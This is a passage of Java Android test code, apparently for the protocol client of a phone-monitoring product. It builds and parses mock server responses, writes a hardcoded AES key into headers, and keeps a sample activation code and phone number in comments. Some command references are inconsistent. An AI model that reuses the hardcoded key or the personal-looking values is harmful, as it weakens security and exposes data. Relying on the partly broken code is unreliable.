		//1.2 put cmd echo : short 2 bytes
		//short cmd = (short) Command.ACTIVATE.ordinal();
		//short cmd = (short) Command.DEACTIVATE.ordinal();
		//short cmd = (short) Command.SEND.ordinal();
		//short cmd = (short) Command.RSEND.ordinal();
		//short cmd = (short) Command.RASK.ordinal();
		//short cmd = (short) Command.HEARTBEAT.ordinal();
		//short cmd = (short) Command.REQUEST_CONFIGURATION.ordinal();
		//short cmd = (short) Command.GETCSID.ordinal();
		//short cmd = (short) Command.CLEARSID.ordinal();
		short cmd = (short) com.vvt.protocol.REQUEST_ACTIVATE.ordinal();
		//short cmd = (short) Command.CMD_NEXT_RESPONSE.ordinal();		
		buffer.writeShort(cmd);
		//1.3 set other header fields
		setResponseHead(buffer);	
		
		//1.4 extra fields
		if(cmd == (short) Command.ACTIVATE.ordinal()){
			//1 put md5
			byte[] md5 = {97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112};	//letter a-p
			buffer.writeBytes(md5.length, 0, md5);
			//2 put config ID
			buffer.writeShort((short) 7);
		}else if(cmd == (short) com.vvt.protocol.RASK.ordinal()){
			//1 number of bytes
			buffer.writeInt(16);
		}if(cmd == (short) Command.REQUEST_CONFIGURATION.ordinal()){
			//1 put md5
			byte[] md5 = {97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112};	//letter a-p
			buffer.writeBytes(md5.length, 0, md5);
			//2 put config ID
			buffer.writeShort((short) 7);
		}if(cmd == (short) Command.GETCSID.ordinal()){
			//1 put number of session
			buffer.writeByte((byte) 3);
			//2 put CSIDx
			byte[] csidx = {97, 98, 99};
			buffer.writeBytes(csidx.length, 0, csidx);
		}if(cmd == (short) com.vvt.protocol.REQUEST_ACTIVATE.ordinal()){
			//1 put md5
			byte[] md5 = {97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112};	//letter a-p
			buffer.writeBytes(md5.length, 0, md5);
			//2 put config ID
			buffer.writeShort((short) 7);
			//3 put Activation Code
			String atvCode = "terminator";
			buffer.writeByte((byte) atvCode.length());
			buffer.writeUTF(atvCode);
		}
		
		//1.5 calculate crc32
		long crc = CRC32Checksum.calculateSynchronous(buffer.toArray());
		//1.6 put crc32 and data
		DataBuffer result = new DataBuffer();
		result.writeInt((int) crc);
		byte[] buf = buffer.toArray();
		result.writeBytes(buf.length, 0, buf);
		
		//2 parse response data to response object
		ServerResponse response = null;
		try {
			response = ProtocolParser.parseResponse(result.toArray());
		} catch (DataCorruptedException e) {
			if(LOCAL_LOGE)Log.e(TAG, "Can't Create Response Object: "+e.getMessage());
		}
		
		//3 check response type
		if(response instanceof ActivateResponse){
			displayAtvResInfo(response);							// have extra fields, so we use specific method
		}else if(response instanceof DeactivateResponse){
			displayResponseInfo(response);
		}else if(response instanceof SendResponse){
			displayResponseInfo(response);
		}else if(response instanceof RSendResponse){
			displayResponseInfo(response);
		}else if(response instanceof RAskResponse){
			displayRAskResInfo(response);							// have extra fields, so we use specific method
		}else if(response instanceof HeartbeatResponse){
			displayResponseInfo(response);
		}else if(response instanceof RequestConfigResponse){		// have extra fields, so we use specific method
			displayRequestConfigResInfo(response);
		}else if(response instanceof GetCSIDResponse){				// have extra fields, so we use specific method
			displayGetCSIDResInfo(response);
		}else if(response instanceof ClearSIDResponse){
			displayResponseInfo(response);
		}else if(response instanceof RequestActivationResponse){	// have extra fields, so we use specific method
			displayRequestAtvResInfo(response);
		}
		
		
	}
	
	public void setResponseHead(DataBuffer buffer){
		//1 set status code
		buffer.writeShort((short) 200);
		
		//2 set message and length
		String msg = "bboydewey";
		buffer.writeShort((short) msg.length());
		buffer.writeUTF(msg);
		
		//3 set extended status
		buffer.writeInt(7);
		
		//4 set CMD_NEXT
		
	}
	
	private void displayResponseInfo(ServerResponse response){
		if(LOCAL_LOGV)Log.v(TAG, "ServerID: "+response.getServerID());
		if(LOCAL_LOGV)Log.v(TAG, "Command: "+response.getCmdEcho());
		if(LOCAL_LOGV)Log.v(TAG, "Status Code: "+response.getStatusCode());
		if(LOCAL_LOGV)Log.v(TAG, "Message: "+response.getMessage());
		if(LOCAL_LOGV)Log.v(TAG, "Extended Status: "+response.getExtendedStatus());
		//if(LOCAL_LOGV)Log.v(TAG, "CMD_NEXT: "+response.);
	}
	private void displayAtvResInfo(ServerResponse r){
		ActivateResponse response = (ActivateResponse) r;
		if(LOCAL_LOGV)Log.v(TAG, "ServerID: "+response.getServerID());
		if(LOCAL_LOGV)Log.v(TAG, "Command: "+response.getCmdEcho());
		if(LOCAL_LOGV)Log.v(TAG, "Status Code: "+response.getStatusCode());
		if(LOCAL_LOGV)Log.v(TAG, "Message: "+response.getMessage());
		if(LOCAL_LOGV)Log.v(TAG, "Extended Status: "+response.getExtendedStatus());
		//if(LOCAL_LOGV)Log.v(TAG, "CMD_NEXT: "+response.);
		if(LOCAL_LOGV)Log.v(TAG, "MD5: "+new String(response.getMD5()));
		if(LOCAL_LOGV)Log.v(TAG, "ConfigID: "+response.getConfigID());
		
	}
	private void displayRAskResInfo(ServerResponse r){
		RAskResponse response = (RAskResponse) r;
		if(LOCAL_LOGV)Log.v(TAG, "ServerID: "+response.getServerID());
		if(LOCAL_LOGV)Log.v(TAG, "Command: "+response.getCmdEcho());
		if(LOCAL_LOGV)Log.v(TAG, "Status Code: "+response.getStatusCode());
		if(LOCAL_LOGV)Log.v(TAG, "Message: "+response.getMessage());
		if(LOCAL_LOGV)Log.v(TAG, "Extended Status: "+response.getExtendedStatus());
		//if(LOCAL_LOGV)Log.v(TAG, "CMD_NEXT: "+response.);
		if(LOCAL_LOGV)Log.v(TAG, "Number of bytes: "+response.getNumberOfBytes());
	}
	private void displayRequestConfigResInfo(ServerResponse r){
		RequestConfigResponse response = (RequestConfigResponse) r;
		if(LOCAL_LOGV)Log.v(TAG, "ServerID: "+response.getServerID());
		if(LOCAL_LOGV)Log.v(TAG, "Command: "+response.getCmdEcho());
		if(LOCAL_LOGV)Log.v(TAG, "Status Code: "+response.getStatusCode());
		if(LOCAL_LOGV)Log.v(TAG, "Message: "+response.getMessage());
		if(LOCAL_LOGV)Log.v(TAG, "Extended Status: "+response.getExtendedStatus());
		//if(LOCAL_LOGV)Log.v(TAG, "CMD_NEXT: "+response.);
		if(LOCAL_LOGV)Log.v(TAG, "MD5: "+new String(response.getMD5()));
		if(LOCAL_LOGV)Log.v(TAG, "ConfigID: "+response.getConfigID());
		
	}
	private void displayGetCSIDResInfo(ServerResponse r){
		GetCSIDResponse response = (GetCSIDResponse) r;
		if(LOCAL_LOGV)Log.v(TAG, "ServerID: "+response.getServerID());
		if(LOCAL_LOGV)Log.v(TAG, "Command: "+response.getCmdEcho());
		if(LOCAL_LOGV)Log.v(TAG, "Status Code: "+response.getStatusCode());
		if(LOCAL_LOGV)Log.v(TAG, "Message: "+response.getMessage());
		if(LOCAL_LOGV)Log.v(TAG, "Extended Status: "+response.getExtendedStatus());
		//if(LOCAL_LOGV)Log.v(TAG, "CMD_NEXT: "+response.);
		if(LOCAL_LOGV)Log.v(TAG, "Number of sessions: "+response.getNumberOfSession());
		if(LOCAL_LOGV)Log.v(TAG, "CSIDx: "+new String(response.getCSIDx()));
		
	}
	private void displayRequestAtvResInfo(ServerResponse r){
		RequestActivationResponse response = (RequestActivationResponse) r;
		if(LOCAL_LOGV)Log.v(TAG, "ServerID: "+response.getServerID());
		if(LOCAL_LOGV)Log.v(TAG, "Command: "+response.getCmdEcho());
		if(LOCAL_LOGV)Log.v(TAG, "Status Code: "+response.getStatusCode());
		if(LOCAL_LOGV)Log.v(TAG, "Message: "+response.getMessage());
		if(LOCAL_LOGV)Log.v(TAG, "Extended Status: "+response.getExtendedStatus());
		//if(LOCAL_LOGV)Log.v(TAG, "CMD_NEXT: "+response.);
		if(LOCAL_LOGV)Log.v(TAG, "MD5: "+new String(response.getMD5()));
		if(LOCAL_LOGV)Log.v(TAG, "ConfigID: "+response.getConfigID());
		if(LOCAL_LOGV)Log.v(TAG, "Activation Code: "+response.getActivationCode());
		
	}
	
	*/
	
	///////////////////////////////////// utilities methods /////////////////////////////////////////////////////
	
	private void setRequestHeader(CommandData req){
		/*
		//1 set encryption type
		req.setEncryptionType(0);
		
		//2 set sessionID
		req.setSessionid(1);
		
		//3 set AES Key
		byte[] key = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
		req.setAESKey(key);
		*/
		//4 set protocol version
		/*req.setProtocolVersion(2);
		
		//5 set productID
		req.setProductId(5);
		
		//6 set product version
		req.setProductVersion("FXS");
		
		//7 set configID
		req.setConfId(4);
		
		//8 set deviceID
		req.setDeviceId("HTC_N1");
		
		//9 set Activation Code
		req.setActivationCode("0526452132365");
		
		//10 set Language
		//req.setLanguage(1);
		req.setLanguage(Languages.THAI);
		
		//11 set phone number
		req.setPhoneNumber("+66866980807");
		
		//12 set MCC
		req.setMcc("66");
		
		//13 set MNC
		req.setMnc("01");*/
		
		//14 set Command
		// not apply
	}

	// this method hard code for head of client header (act as delivery module)
	private byte[] hardCodeHeader(byte[] tail){
		DataBuffer buffer = new DataBuffer();
		//1 put encryption type
		buffer.writeByte((byte) 0);
		//2 put session ID
		buffer.writeInt(1);
		//3 put AES key wiht length
		byte[] key = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
		int keyLen = key.length;
		buffer.writeShort((short) keyLen);
		buffer.writeBytes(keyLen, 0, key);
		//4 append with tail
		int tailLen = tail.length;
		buffer.writeBytes(tailLen, 0, tail);
		
		return buffer.toArray();
	}
	
	private byte[] hardCodeHeader(SecretKey key, byte[] encryptedTail){
		DataBuffer buffer = new DataBuffer();
		//1 put encryption type
		buffer.writeByte((byte) 1);
		//2 put session ID
		buffer.writeInt(1);
		//3 put AES key with length
		byte[] encodedKey = key.getEncoded();
		int keyLen = encodedKey.length;
		buffer.writeShort((short) keyLen);
		buffer.writeBytes(keyLen, 0, encodedKey);
		/*
		//4 append with tail
		int tailLen = encryptedTail.length;
		buffer.writeBytes(tailLen, 0, encryptedTail);
		*/
		//4 append with tail with length
		//int tailLen = encryptedTail.length;
		int tailLen = encryptedTail.length;
		buffer.writeShort((short) (tailLen - 4));	 //skip crc32 length
		buffer.writeBytes(tailLen, 0, encryptedTail);
		
		return buffer.toArray();
	}
	

	
	private void writeToFile(String filename, byte[] data){
		FileOutputStream fOut = null;
		try {
			fOut = mContext.openFileOutput(filename, Context.MODE_PRIVATE);
			fOut.write(data);
			fOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
	}

	private byte[] readFromFile(String filename){
		File file = mContext.getFileStreamPath(filename);
		int fileSize = (int) file.length();
		Log.v(TAG, filename+" size = "+fileSize);
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find "+filename);
		}
		byte[] fileData = new byte[fileSize];
		try {
			int readed = fIn.read(fileData);
			Log.v(TAG, "Read from file : "+readed);
			fIn.close();
		} catch (IOException e) {
			Log.e(TAG, "IOException while read or close");
		}
		
		return fileData;
	}

	/*@Override
	public void onCalculateCRC32Error(Exception err) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onCalculateCRC32Success(long result) {
		// TODO Auto-generated method stub
		
	}*/
	

	
}


